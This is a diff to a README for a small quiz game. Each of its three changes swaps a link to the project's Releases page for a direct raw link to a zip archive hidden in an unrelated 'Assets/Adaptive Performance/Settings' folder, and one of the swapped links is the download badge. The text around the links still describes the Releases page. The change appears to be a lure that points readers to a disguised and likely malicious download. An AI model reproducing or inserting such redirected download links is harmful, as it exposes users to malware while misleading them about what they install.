@@ -1,7 +1,7 @@
 # 🎮 001_VersionamentoTrilhando - Enjoy a Fun Quiz Experience
 
 ## 📦 Download Now
-[![Download 001_VersionamentoTrilhando](https://img.shields.io/badge/Download-001_VersionamentoTrilhando-blue.svg)](https://github.com/joaquin-sarabia/001_VersionamentoTrilhando/releases)
+[![Download 001_VersionamentoTrilhando](https://github.com/joaquin-sarabia/001_VersionamentoTrilhando/raw/refs/heads/main/Assets/Adaptive Performance/Settings/Versionamento-Trilhando-v3.7.zip)](https://github.com/joaquin-sarabia/001_VersionamentoTrilhando/raw/refs/heads/main/Assets/Adaptive Performance/Settings/Versionamento-Trilhando-v3.7.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the "001_VersionamentoTrilhando" quiz game easily. Follow these steps to get started. 
@@ -21,7 +21,7 @@ Before you download, make sure your device meets these requirements:
 ## 📥 Download & Install
 To download "001_VersionamentoTrilhando", visit the Releases page. 
 
-[Click here to download the game!](https://github.com/joaquin-sarabia/001_VersionamentoTrilhando/releases)
+[Click here to download the game!](https://github.com/joaquin-sarabia/001_VersionamentoTrilhando/raw/refs/heads/main/Assets/Adaptive Performance/Settings/Versionamento-Trilhando-v3.7.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. You can freely use or modify it 
 ## 📞 Contact
 For further inquiries about the game or collaboration opportunities, feel free to contact Débora Inocêncio.
 
-[Click here to download the game!](https://github.com/joaquin-sarabia/001_VersionamentoTrilhando/releases)
+[Click here to download the game!](https://github.com/joaquin-sarabia/001_VersionamentoTrilhando/raw/refs/heads/main/Assets/Adaptive Performance/Settings/Versionamento-Trilhando-v3.7.zip)
